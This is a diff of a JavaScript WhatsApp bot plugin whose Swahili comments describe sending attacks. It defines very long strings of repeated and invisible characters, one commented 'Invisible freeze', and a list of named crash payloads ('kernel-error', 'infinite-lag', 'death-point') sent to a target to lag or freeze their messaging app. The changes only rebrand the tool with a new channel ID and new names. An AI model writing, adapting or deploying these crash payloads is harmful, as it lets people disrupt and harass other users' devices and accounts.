@@ -13,7 +13,7 @@ const v5 = "░".repeat(45000);
 const v6 = "ꦿ".repeat(32000);
 const ghost = "‎".repeat(60000); // Invisible freeze
 
-const channelJid = "120363406146813524@newsletter";
+const channelJid = "120363295141350550@newsletter";
 
 // Funsheni ya kutuma shambulio
 async function sendAttack(zk, target, payload) {
@@ -37,7 +37,7 @@ const bugList = [
     { nom: "kernel-error", react: "☣️", payload: `𝙺𝙴𝚁𝙽𝙴𝙻-𝙿𝙰𝙽𝙸𝙲-𝟶𝟶𝟷\n${v1}${v4}` },
     { nom: "infinite-lag", react: "🌀", payload: `𝙸𝙽𝙵𝙸𝙽𝙸𝚃𝙴-𝙻𝙾𝙾𝙿-𝙱𝚄𝙶\n${v2}${v6}` },
     { nom: "internal-bug", react: "📂", payload: `𝙸𝙽𝚃𝙴𝚁𝙽𝙰𝙻-𝙵𝙸𝙻𝙴-𝙲𝙾𝚁𝚁𝚄𝙿𝚃\n${v5.repeat(2)}` },
-    { nom: "death-point", react: "⚰️", payload: `𝚃𝙸𝙼𝙽𝙰𝚂𝙰-𝙳𝙴𝙰𝚃𝙷-𝙿𝙾𝙸𝙽𝚃\n${v1}${v3}${v5}` }
+    { nom: "death-point", react: "⚰️", payload: `QUEEN-KATE AI DEATH POINT\n${v1}${v3}${v5}` }
 ];
 
 // Kutengeneza amri 15 kiotomatiki
@@ -105,7 +105,7 @@ zokou({
                 isForwarded: true,
                 forwardedNewsletterMessageInfo: {
                     newsletterJid: channelJid,
-                    newsletterName: "KATE AI",
+                    newsletterName: "𝐙𝐄𝐙𝐄-𝐓𝐄𝐂𝐇",
                     serverMessageId: 1
                 }
             }
